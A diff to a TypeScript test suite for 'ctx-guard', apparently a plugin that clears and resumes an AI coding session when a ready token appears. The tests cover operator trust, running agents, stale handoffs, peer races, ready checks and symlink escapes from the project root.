@@ -25,6 +25,20 @@ type World = {
   version: string
   notifies: string[]
   failUsage: boolean
+  sessionId: string
+  agents: { id: string; status: string; description: string; type: string }[]
+  // Every command a plugin ran, `name args`, and how the bottom answers them.
+  ran: string[]
+  failCommand: string | null
+  // How long the bottom holds a command before answering it, by name.
+  hang: Record<string, number>
+  processes: string[][]
+  exitCode: number | 'timeout'
+  // path → where it really lands (a symlink); absent means the path itself.
+  links: Record<string, string>
+  onWrite?: (path: string) => void
+  // Runs as a ready check runs: what another session does meanwhile.
+  onProcess?: () => void
   // The engine's compaction window, answered with a breakdown; null answers none.
   rawMax: number | null
   window: number
@@ -43,6 +57,14 @@ function newWorld(over: Partial<World> = {}): World {
     version: '2.1.296',
     notifies: [],
     failUsage: false,
+    sessionId: 's1',
+    agents: [],
+    ran: [],
+    failCommand: null,
+    hang: {},
+    processes: [],
+    exitCode: 0,
+    links: {},
     rawMax: null,
     window: WINDOW,
     ...over,
@@ -57,9 +79,19 @@ function usageOf(w: World) {
   }
 }
 
+function dirsOf(w: World): Set<string> {
+  const dirs = new Set<string>([ROOT])
+  for (const path of Object.keys(w.files)) {
+    const parts = path.split('/')
+    for (let i = 2; i < parts.length; i++) dirs.add(parts.slice(0, i).join('/'))
+  }
+  return dirs
+}
+
 function world(on: On, w: World, env: Record<string, string> = {}): { clock: MockClock; session: MockSession } {
   const session = mock.session(on)
   mock.env(on, env)
+  mock.store(on)
   const clock = mock.clock(on, { now: NOW })
   w.clock = clock
   on('session.start', ($, e) => ({ cwd: e.cwd }))
@@ -97,10 +129,44 @@ function world(on: On, w: World, env: Record<string, string> = {}): { clock: Moc
   })
   on('fs.stat', ($, e) => {
     const f = w.files[e.path]
-    if (!f) throw new Error(`ENOENT: ${e.path}`)
-    return { value: { kind: 'file' as const, size: f.text.length, mtimeMs: f.mtimeMs, isLink: false } }
+    const isDir = dirsOf(w).has(e.path) || e.path in w.links
+    if (!f && !isDir) throw new Error(`ENOENT: ${e.path}`)
+    const link = w.links[e.path]
+    const kind = f ? ('file' as const) : ('dir' as const)
+    return { value: { kind, size: f?.text.length ?? 0, mtimeMs: f?.mtimeMs ?? 0, isLink: link !== undefined, ...(e.resolve ? { realPath: link ?? e.path } : {}) } }
   })
-  on('fs.exists', ($, e) => ({ value: e.path in w.files }))
+  on('fs.list', ($, e) => {
+    const dirs = dirsOf(w)
+    if (!dirs.has(e.path)) throw new Error(`ENOENT: ${e.path}`)
+    const names = new Set<string>()
+    for (const p of [...Object.keys(w.files), ...dirs]) if (p.startsWith(`${e.path}/`)) names.add(p.slice(e.path.length + 1).split('/')[0] ?? '')
+    return {
+      value: [...names].map(name => {
+        const path = `${e.path}/${name}`
+        const isDir = dirs.has(path)
+        return { name, kind: isDir ? ('dir' as const) : ('file' as const), size: 0, mtimeMs: isDir ? 0 : (w.files[path]?.mtimeMs ?? 0), isLink: false }
+      }),
+    }
+  })
+  on('session.id', () => ({ value: w.sessionId }))
+  on('agent.list', () => ({ value: w.agents as never }))
+  on('command.run', async ($, e) => {
+    // Reached only when ctx-guard is inert and another plugin owns /ctx-guard.
+    if (e.command === 'ctx-guard') return { text: 'the other plugin' }
+    w.ran.push(e.args ? `${e.command} ${e.args}` : e.command)
+    const hold = w.hang[e.command] ?? 0
+    if (hold > 0) await clock.sleep(hold)
+    if (w.failCommand === e.command) throw new Error(`${e.command} refused`)
+    return { text: '' }
+  })
+  on('process.run', ($, e) => {
+    w.processes.push([...e.argv])
+    w.onProcess?.()
+    if (w.exitCode === 'timeout') throw new Error('timed out')
+    return { value: { exitCode: w.exitCode, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
+  })
+  on('fs.exists', ($, e) => ({ value: e.path in w.files || dirsOf(w).has(e.path) || e.path in w.links }))
+  on('classic.Stop', () => ({}))
   on('fs.read', ($, e) => {
     const f = w.files[e.path]
     if (!f) throw new Error(`ENOENT: ${e.path}`)
@@ -108,6 +174,7 @@ function world(on: On, w: World, env: Record<string, string> = {}): { clock: Moc
   })
   on('fs.write', ($, e) => {
     w.files[e.path] = { text: e.text, mtimeMs: clock.now() }
+    w.onWrite?.(e.path)
     return { value: undefined }
   })
   on('tool.call', () => ({ result: 'ran' as never }))
@@ -461,8 +528,8 @@ test('unknown subcommands answer with the usage', async ($, on) => {
   const w = newWorld()
   world(on, w)
   await start($)
-  const text = await ctxGuard($, 'trust')
-  expect(text).toContain('unknown subcommand "trust"')
+  const text = await ctxGuard($, 'frobnicate')
+  expect(text).toContain('unknown subcommand "frobnicate"')
   expect(text).toContain('Usage:')
 })
 
@@ -470,7 +537,6 @@ test('another plugin owning /ctx-guard leaves ctx-guard inert', async ($, on) =>
   const w = newWorld({ commands: [{ name: 'ctx-guard', source: 'plugin', plugin: 'someone-else' }] })
   writeConfig(w, LEAD_SOFT)
   const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
-  on('command.run', () => ({ text: 'the other plugin' }))
   await start($)
   await start($)
   expect(w.toasts.filter(t => t.includes('/ctx-guard already belongs to the someone-else plugin')).length).toBe(1)
@@ -735,4 +801,721 @@ test('the engine window is read again when the context starts over and every 10t
   expect(w.statuses.at(-1)).toBe('240k (80%)')
   await measure($, w, 240_000)
   expect(w.statuses.at(-1)).toBe('240k (50%)')
+})
+
+// ---- restart: ready token → clear + resume ----------------------------------
+
+const MIN = 60 * 1000
+const RACE_SETTLE_MS = 1500
+const STATE = `${ROOT}/.ctx-guard`
+const HANDOFF = `${STATE}/lead-handoff.md`
+const RESUME = 'ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md Carry on.'
+const RESTART_COMMANDS: World['commands'] = [
+  { name: 'clear', source: 'builtin' },
+  { name: 'compact', source: 'builtin' },
+  { name: 'ctx-guard:resume', source: 'plugin', plugin: 'ctx-guard' },
+]
+
+function autoConfig(restart: Record<string, unknown> = {}, handoff: Record<string, unknown> = {}) {
+  return {
+    version: 1,
+    roles: {
+      lead: {
+        triggers: [{ id: 'soft', when: { context: '300k' }, do: ['note'], level: 'soft' }],
+        handoff: { instructions: 'Sections: Goal, State, Next action.', ...handoff },
+        restart: { mode: 'auto', prompt: 'Carry on.', peers: ['reviewer'], peerGap: '10m', ...restart },
+      },
+      reviewer: {},
+    },
+  }
+}
+
+function restartWorld(over: Partial<World> = {}): World {
+  return newWorld({ commands: RESTART_COMMANDS, ...over })
+}
+
+// A handoff written a minute after the session start.
+async function writeHandoff(w: World, clock: MockClock, path = HANDOFF): Promise<void> {
+  await clock.advance(MIN)
+  w.files[path] = { text: '# handoff\n', mtimeMs: clock.now() }
+}
+
+type Task = { id: string; type: string; status: string; description: string }
+
+// The main turn's end as the engine raises it: its Stop (with what is in flight), then turn.complete.
+async function ready($: Engine, clock: MockClock, answer = 'Handoff written.\n\nCTX-READY', background: Task[] | 'none' = []): Promise<void> {
+  await $.classic.Stop(background === 'none' ? { stop_hook_active: false } : { stop_hook_active: false, background_tasks: background })
+  await $.turn.complete({ answer, durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
+  await clock.settle()
+  // The race's settle period after the stamp is written.
+  await clock.advance(RACE_SETTLE_MS)
+}
+
+const refusals = (s: MockSession): string[] => notes(s).filter(n => n.includes('CTX-READY ignored'))
+
+// A trusted lead with a fresh handoff: everything a restart needs.
+async function armed($: Engine, on: On, w: World, config: unknown = autoConfig()): Promise<{ clock: MockClock; session: MockSession }> {
+  writeConfig(w, config)
+  const env = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($)
+  expect(await ctxGuard($, 'trust')).toContain('approved for /repo')
+  await writeHandoff(w, env.clock)
+  return env
+}
+
+const PEEK_RESTART: Plugin = {
+  name: 'peek-restart',
+  register: on => {
+    on('command.run', { command: 'peek-restart' }, async $ => {
+      const pendingResume = (await $.state.get({ plugin: 'ctx-guard', key: 'pendingResume' })).value ?? null
+      const lastVerdict = (await $.state.get({ plugin: 'ctx-guard', key: 'lastVerdict' })).value ?? null
+      const band = (await $.state.get({ plugin: 'ctx-guard', key: 'band' })).value ?? null
+      return { text: JSON.stringify({ pendingResume, lastVerdict, band }) }
+    })
+  },
+}
+
+async function peekRestart($: Engine): Promise<{ pendingResume: { step: string } | null; lastVerdict: { code: string } | null; band: { restartFailed: string | null } | null }> {
+  const r = await $.command.run({ command: 'peek-restart', args: '', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
+  return JSON.parse(r.text ?? 'null')
+}
+
+test('a trusted ready token: pendingResume, then /clear, then the resume, then cleared', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { clear: 1000, 'ctx-guard:resume': 1000 } })
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear'])
+  expect((await peekRestart($)).pendingResume?.step).toBe('clear')
+  await clock.advance(1000)
+  expect(w.ran).toEqual(['clear', RESUME])
+  expect((await peekRestart($)).pendingResume?.step).toBe('sent')
+  await clock.advance(1000)
+  expect(refusals(session)).toEqual([])
+  const after = await peekRestart($)
+  expect(after.pendingResume).toBeNull()
+  expect(after.lastVerdict?.code).toBe('ok')
+  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}')).toEqual({ owner: 's1', at: clock.now() - RACE_SETTLE_MS - 2000 })
+  expect(await ctxGuard($, '')).toContain('last verdict: ok')
+})
+
+test('a ready token mid-line or on an earlier line does nothing', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock, 'I will end with CTX-READY once done.')
+  await ready($, clock, 'CTX-READY\nnot yet')
+  expect(w.ran).toEqual([])
+  expect(refusals(session)).toEqual([])
+  await ready($, clock, 'Done.\n`CTX-READY`.')
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('a subagent answer or an interrupted turn ending on the token does nothing', async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w)
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer', agentId: 'sub-1' })
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: true, turnId: 't1', reason: 'aborted' })
+  await clock.settle()
+  expect(w.ran).toEqual([])
+})
+
+test('manual mode never clears', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w, autoConfig({ mode: 'manual' }))
+  await ready($, clock)
+  expect(w.ran).toEqual([])
+  expect(refusals(session)).toEqual([])
+})
+
+test('autoActions off never clears', { options: { autoActions: false } }, async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  expect(w.ran).toEqual([])
+})
+
+test('a pause holds the restart back', async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w)
+  await ctxGuard($, 'pause 10m')
+  await ready($, clock)
+  expect(w.ran).toEqual([])
+})
+
+test('untrusted: refused, never clears, never runs a ready check; the note asks for the operator', async ($, on) => {
+  const w = restartWorld()
+  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
+  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($)
+  await writeHandoff(w, clock)
+  await measure($, w, 310_000)
+  expect(notes(session)[0]).toContain("tell the operator 'ready for /clear'")
+  await ready($, clock)
+  expect(w.ran).toEqual([])
+  expect(w.processes).toEqual([])
+  expect(refusals(session)[0]).toContain('CTX-READY ignored (untrusted)')
+  expect(refusals(session)[0]).toContain('Nothing was cleared.')
+  const report = await ctxGuard($, '')
+  expect(report).toContain('trust: not approved (needs approval: *.readyToken, *.stateDir, lead.compact, lead.compactTriggers, lead.handoff, lead.restart')
+  expect(report).toContain('last verdict: untrusted')
+  expect(await ctxGuard($, 'check')).toContain('--   ready-check-failed: not run: the repo is not trusted')
+  expect(w.processes).toEqual([])
+})
+
+test('trust is the operator\'s, and any change to a trusted field withdraws it', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  expect(await ctxGuard($, 'trust', 'plugin')).toContain('only the operator can run /ctx-guard trust')
+  expect(await ctxGuard($, '')).toContain('trust: approved')
+  await clock.advance(1000)
+  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./other.sh'] }] }))
+  await measure($, w, 100_000)
+  expect(await ctxGuard($, '')).toContain('trust: not approved (needs approval: lead.restart)')
+  await ready($, clock)
+  expect(w.ran).toEqual([])
+  expect(refusals(session)[0]).toContain('(untrusted)')
+  // A change outside the trusted fields keeps it.
+  await ctxGuard($, 'trust')
+  await clock.advance(1000)
+  writeConfig(w, { ...autoConfig({ readyChecks: [{ run: ['./other.sh'] }] }), readyToken: 'CTX-READY' })
+  await measure($, w, 100_000)
+  expect(await ctxGuard($, '')).toContain('trust: approved')
+})
+
+test('already-busy: a second token while the restart runs', async ($, on) => {
+  const w = restartWorld({ hang: { clear: 30_000 } })
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  await ready($, clock)
+  expect(refusals(session).map(r => r.includes('(already-busy)'))).toEqual([true])
+  await clock.advance(30_000)
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('no-restart-command', async ($, on) => {
+  const w = restartWorld({ commands: [{ name: 'clear', source: 'builtin' }] })
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain("(no-restart-command): /ctx-guard:resume is not among the session's commands")
+  expect(w.ran).toEqual([])
+})
+
+test('agents-running: a listed agent', async ($, on) => {
+  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'review the diff', type: 'general-purpose' }] })
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(agents-running): agents still running: review the diff')
+  expect(w.ran).toEqual([])
+})
+
+test('agents-running: an unlisted agent seen stepping, until its turn completes', async ($, on) => {
+  const w = restartWorld()
+  stepBottom(on, () => 20_000)
+  const { clock, session } = await armed($, on, w)
+  await step($, clock, 'wf-1')
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(agents-running): agents still running: agent wf-1 (stepped recently)')
+  await $.turn.complete({ answer: 'report', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer', agentId: 'wf-1' })
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('background-tasks from the last Stop', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock, undefined, [{ id: 'b1', type: 'shell', status: 'running', description: 'npm run watch' }])
+  expect(refusals(session)[0]).toContain('(background-tasks): background tasks still running: npm run watch')
+  // A Stop with no list is unknown, not empty.
+  await ready($, clock, undefined, 'none')
+  expect(refusals(session)[1]).toContain('(background-tasks): background tasks unknown')
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('role-shared: another live session holds the lease; one warning toast', async ($, on) => {
+  const w = restartWorld()
+  w.files[`${STATE}/lead.owner`] = { text: JSON.stringify({ sessionId: 'other', heartbeat: NOW }), mtimeMs: NOW }
+  const { clock, session } = await armed($, on, w)
+  await measure($, w, 100_000)
+  await clock.advance(6 * MIN)
+  await measure($, w, 100_000)
+  expect(w.toasts.filter(t => t.includes('another live session (other) holds role "lead"')).length).toBe(1)
+  expect(JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}').sessionId).toBe('other')
+  await writeHandoff(w, clock)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(role-shared): another live session (other) holds role')
+  expect(await ctxGuard($, '')).toContain('lease: held by another live session (other')
+  expect(w.ran).toEqual([])
+})
+
+test('the lease: written on start, beaten by the band timer and on measure, released at the end but not on /clear', async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w)
+  const owner = () => JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}')
+  expect(owner()).toEqual({ sessionId: 's1', heartbeat: NOW })
+  // No measure at all: the 5-minute band timer beats.
+  await clock.advance(4 * MIN)
+  expect(owner().heartbeat).toBe(NOW + 5 * MIN)
+  await clock.advance(5 * MIN)
+  await measure($, w, 100_000)
+  expect(owner().heartbeat).toBe(NOW + 10 * MIN)
+  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
+  expect(owner().heartbeat).toBe(clock.now())
+  expect(await ctxGuard($, '')).toContain('lease: held by this session')
+  await $.session.end({ reason: 'prompt_input_exit', sessionId: 's2', resume: {} as never })
+  expect(owner().heartbeat).toBe(0)
+})
+
+test('no-handoff', async ($, on) => {
+  const w = restartWorld()
+  writeConfig(w, autoConfig())
+  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($)
+  await ctxGuard($, 'trust')
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(no-handoff): .ctx-guard/lead-handoff.md does not exist')
+})
+
+test('handoff-stale: written before the session start, or before the last /clear', async ($, on) => {
+  const w = restartWorld()
+  w.files[HANDOFF] = { text: '# old\n', mtimeMs: NOW - 1 }
+  writeConfig(w, autoConfig())
+  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($)
+  await ctxGuard($, 'trust')
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(handoff-stale)')
+  await writeHandoff(w, clock)
+  await clock.advance(MIN)
+  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
+  await ready($, clock)
+  expect(refusals(session)[1]).toContain('(handoff-stale)')
+  expect(w.ran).toEqual([])
+})
+
+test('stamp-unreadable', async ($, on) => {
+  const w = restartWorld()
+  w.files[`${STATE}/reviewer.restart`] = { text: 'garbage', mtimeMs: NOW }
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(stamp-unreadable): the restart stamp of reviewer cannot be read')
+})
+
+test('peer-restarting: a peer stamp younger than peerGap', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'other', at: clock.now() - 4 * MIN }), mtimeMs: NOW }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(peer-restarting): the reviewer session restarted 4m ago, under peerGap 10m')
+  await clock.advance(6 * MIN)
+  await writeHandoff(w, clock)
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('ready-check-failed: a non-zero exit or a timeout; exit 0 passes', async ($, on) => {
+  const w = restartWorld({ exitCode: 3 })
+  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh', '--strict'], timeout: '10s' }] }))
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(ready-check-failed): ./ready.sh --strict: exited 3')
+  w.exitCode = 'timeout'
+  await ready($, clock)
+  expect(refusals(session)[1]).toContain('(ready-check-failed): ./ready.sh --strict: did not finish within 10s')
+  w.exitCode = 0
+  await ready($, clock)
+  expect(w.processes).toEqual([
+    ['./ready.sh', '--strict'],
+    ['./ready.sh', '--strict'],
+    ['./ready.sh', '--strict'],
+  ])
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('race-lost: a peer stamp written first; the own stamp is put back', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.onWrite = path => {
+    if (path !== `${STATE}/lead.restart` || w.files[`${STATE}/reviewer.restart`]) return
+    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'other', at: clock.now() - 1 }), mtimeMs: clock.now() }
+  }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(race-lost): the reviewer session started its restart first')
+  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
+  expect(w.ran).toEqual([])
+})
+
+test('error: a handoff that is a symlink out of the root', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.links[HANDOFF] = '/elsewhere/secret.md'
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(error): handoff path .ctx-guard/lead-handoff.md resolves outside the project root')
+  expect(w.ran).toEqual([])
+})
+
+test('error: a state folder that is a symlink out of the root', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.links[STATE] = '/tmp/elsewhere'
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(error): stateDir .ctx-guard resolves outside the project root')
+  expect(w.ran).toEqual([])
+})
+
+test('error: /clear refused puts the stamp back and clears pendingResume', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ failCommand: 'clear' })
+  const { clock, session } = await armed($, on, w)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(error): /clear was refused')
+  expect((await peekRestart($)).pendingResume).toBeNull()
+  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
+})
+
+test('a resume that fails after /clear flags the band', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ failCommand: 'ctx-guard:resume' })
+  writeConfig(w, autoConfig())
+  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($, 'vscode')
+  await ctxGuard($, 'trust')
+  await writeHandoff(w, clock)
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', RESUME])
+  const failed = 'restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md'
+  expect((await peekRestart($)).band?.restartFailed).toBe(failed)
+  expect(w.statuses.at(-1)).toContain(failed)
+  expect((await peekRestart($)).pendingResume).toBeNull()
+  // Typing the resume by hand clears the flag.
+  w.failCommand = null
+  await $.command.run({ command: 'ctx-guard:resume', args: 'role=lead handoff=.ctx-guard/lead-handoff.md', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
+  expect((await peekRestart($)).band?.restartFailed).toBeNull()
+})
+
+test('a reload during /clear: the next session start finishes the resume once', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { clear: 60_000 } })
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  expect((await peekRestart($)).pendingResume?.step).toBe('clear')
+  // The clear goes through, then the module reloads before the old timer resumes.
+  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
+  await start($)
+  await clock.settle()
+  expect(w.ran).toEqual(['clear', RESUME])
+  expect((await peekRestart($)).pendingResume).toBeNull()
+  await clock.advance(60_000)
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('a pending resume too old to finish is dropped and flagged', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { clear: 60 * MIN } })
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
+  await clock.advance(6 * MIN)
+  await start($)
+  await clock.settle()
+  expect(w.ran).toEqual(['clear'])
+  const after = await peekRestart($)
+  expect(after.pendingResume).toBeNull()
+  expect(after.band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
+  expect(w.toasts.some(t => t.includes('too old to finish'))).toBe(true)
+})
+
+test('a pending resume whose /clear never ran is dropped: nothing was cleared', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { clear: 60 * MIN } })
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  await start($)
+  await clock.settle()
+  expect(w.ran).toEqual(['clear'])
+  expect((await peekRestart($)).pendingResume).toBeNull()
+  expect(w.toasts.some(t => t.includes('nothing was cleared'))).toBe(true)
+})
+
+test('session-handoff style: the newest file under the role slug is the handoff', async ($, on) => {
+  const w = restartWorld()
+  const dir = `${ROOT}/.claude/session-handoffs/ctx-guard-lead`
+  const { clock, session } = await armed($, on, w, autoConfig({}, { style: 'session-handoff' }))
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(no-handoff): .claude/session-handoffs/ctx-guard-lead/*.md does not exist')
+  w.files[`${dir}/20261013-1100-aaaa.md`] = { text: '#', mtimeMs: clock.now() + 1 }
+  w.files[`${dir}/20261013-1105-bbbb.md`] = { text: '#', mtimeMs: clock.now() + 2 }
+  await clock.advance(1000)
+  await measure($, w, 310_000)
+  expect(notes(session).at(-1)).toContain(
+    'with the session-handoff skill: Sections: Goal, State, Next action. Use the project slug `ctx-guard-lead` and run its handoff tool from the project root.',
+  )
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', 'ctx-guard:resume role=lead handoff=.claude/session-handoffs/ctx-guard-lead/20261013-1105-bbbb.md Carry on.'])
+})
+
+test('/ctx-guard check: each check, a dry run that writes, races and clears nothing', async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
+  const files = Object.keys(w.files).sort()
+  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
+  expect(await ctxGuard($, 'check', 'plugin')).toContain('only the operator can run /ctx-guard check')
+  expect(w.processes).toEqual([])
+  const ok = await ctxGuard($, 'check')
+  expect(ok).toContain('ctx-guard check (dry run, role lead, via clear; nothing written or cleared):')
+  expect(ok).toContain('ok   untrusted: repo trusted')
+  expect(ok).toContain('ok   no-handoff: .ctx-guard/lead-handoff.md found')
+  expect(ok).toContain('ok   ready-check-failed: 1 ready check passed')
+  expect(ok).toContain('--   race-lost: judged after the stamp is written')
+  expect(ok).toContain('verdict: would restart')
+  expect(w.processes).toEqual([['./ready.sh']])
+  expect(w.ran).toEqual([])
+  expect(Object.keys(w.files).sort()).toEqual(files)
+  w.agents = [{ id: 'a1', status: 'waiting', description: 'scan', type: 'Explore' }]
+  delete w.files[HANDOFF]
+  const refused = await ctxGuard($, 'check')
+  expect(refused).toContain('FAIL agents-running: agents still running: scan')
+  expect(refused).toContain('FAIL no-handoff: .ctx-guard/lead-handoff.md does not exist')
+  expect(refused).toContain('verdict: refused (agents-running)')
+  await clock.settle()
+  expect(w.ran).toEqual([])
+})
+
+test('/ctx-guard check with no role, and in manual mode', async ($, on) => {
+  const w = restartWorld()
+  writeConfig(w, autoConfig({ mode: 'manual' }))
+  world(on, w)
+  await start($)
+  expect(await ctxGuard($, 'check')).toBe('ctx-guard check: no role, so no restart to check')
+  await ctxGuard($, 'role lead')
+  expect(await ctxGuard($, 'check')).toContain('note: the ready token is not acted on now (restart mode is manual)')
+})
+
+test('a typed resume claims its role for a session with none; a different held role is refused', async ($, on) => {
+  const w = restartWorld()
+  writeConfig(w, autoConfig())
+  world(on, w)
+  await start($)
+  const run = (args: string, kind: 'composer' | 'plugin' = 'composer') =>
+    $.command.run({ command: 'ctx-guard:resume', args, origin: { kind } as never, presentation: { isFullscreen: false, columns: 120 } })
+  await run('role=lead handoff=.ctx-guard/lead-handoff.md Carry on.')
+  expect(w.ran).toEqual(['ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md Carry on.'])
+  expect(await ctxGuard($, '')).toContain('role: lead (from /ctx-guard:resume)')
+  const refused = await run('role=reviewer handoff=x.md')
+  expect(refused.text).toContain('/ctx-guard:resume refused: this session holds role "lead"')
+  expect(w.ran.length).toBe(1)
+  // Not typed by the person: no claim and no refusal.
+  await run('role=reviewer handoff=x.md', 'plugin')
+  expect(w.ran.length).toBe(2)
+  expect(await ctxGuard($, '')).toContain('role: lead (from /ctx-guard:resume)')
+  expect((await run('role=Bad!')).text).toContain('bad arguments')
+  expect((await run('role=ghost')).text).toContain('refused')
+})
+
+test('the report shows trust, the last verdict, the handoff age and the lease owner', async ($, on) => {
+  const w = restartWorld()
+  const { clock } = await armed($, on, w)
+  await clock.advance(2 * MIN)
+  const report = await ctxGuard($, '')
+  expect(report).toContain('trust: approved 3m ago')
+  expect(report).toContain('last verdict: none')
+  expect(report).toContain('handoff: .ctx-guard/lead-handoff.md, written 2m ago')
+  expect(report).toContain('lease: held by this session, heartbeat 3m ago')
+  expect(report).toContain('restart: auto')
+})
+
+// ---- restart: review follow-ups -------------------------------------------------
+
+async function tokenTurn($: Engine, clock: MockClock): Promise<void> {
+  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
+  await clock.settle()
+}
+
+test('a turn started between the token and /clear refuses, and the stamp is put back', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  await tokenTurn($, clock)
+  // The flow waits out the race's settle period; the person types meanwhile.
+  await $.turn.start({ text: 'one more thing', turnId: 't2' })
+  await clock.advance(RACE_SETTLE_MS)
+  expect(refusals(session)[0]).toContain('(already-busy): a turn started after the ready token')
+  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
+  expect(w.ran).toEqual([])
+})
+
+test('a whole turn run between the token and /clear refuses', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  await tokenTurn($, clock)
+  await clock.advance(500)
+  await $.turn.start({ text: 'status?', turnId: 't2' })
+  await $.turn.complete({ answer: 'All good.', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer' })
+  await clock.advance(RACE_SETTLE_MS)
+  expect(refusals(session)[0]).toContain('(already-busy): another turn ran after the ready token')
+  expect(w.ran).toEqual([])
+})
+
+test('an agent started during the ready checks refuses at the re-check', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
+  w.onProcess = () => {
+    w.agents = [{ id: 'a9', status: 'running', description: 'late dispatch', type: 'Explore' }]
+  }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(agents-running): agents still running: late dispatch (started after the checks)')
+  expect(w.ran).toEqual([])
+})
+
